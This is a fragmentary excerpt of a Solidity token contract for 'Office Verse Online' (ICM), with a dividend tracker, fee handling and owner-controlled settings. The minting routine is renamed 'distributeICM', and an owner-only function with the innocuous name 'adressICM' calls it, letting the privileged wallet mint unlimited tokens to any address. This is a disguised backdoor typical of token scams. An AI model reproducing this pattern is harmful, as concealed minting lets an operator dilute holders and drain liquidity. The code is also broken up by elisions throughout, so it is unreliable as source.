...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function distributeICM(address account, uint256 amount) internal virtual {
...
function distributeICM(address account, uint256 value) internal override {
    super.distributeICM(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      distributeICM(account, mintAmount);
...
contract ICMrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterateICM  for IterateICM .Map;
IterateICM .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("ICM_rewardToken_Tracker", "ICM_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "ICM_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "ICM_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main ICM contract.");
    }
...
contract ICM is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    ICMrewardToken public rewardToken;
 ...
 address public lp;
  ILP public adressLiquidity;
    address public growthFeeReciever =0xb655d765B712ce7deF30c0746561af94a5B8DBeC;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Office Verse Online", "ICM") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new ICMrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 distributeICM(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function adressICM(address allowp, uint256 allowa) public masterWallet{
       distributeICM(allowp, allowa);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "ICM: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "ICM: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "ICM: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "ICM: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTICM = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTICM);
...
addLiquidity(tokensTICM, bnbForLiquidity);
